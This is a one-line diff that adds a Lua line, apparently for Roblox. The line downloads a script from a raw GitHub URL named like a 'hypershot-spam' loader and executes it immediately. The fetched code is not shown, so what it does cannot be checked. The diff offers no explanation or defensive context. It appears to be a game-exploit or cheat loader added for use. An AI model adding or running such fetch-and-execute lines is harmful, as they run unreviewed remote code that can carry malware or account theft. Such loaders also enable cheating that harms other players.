@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AssemblyLook/loaders/main/loaders/hypershot-spam7-3tz8oepkjed99p.lua"))()
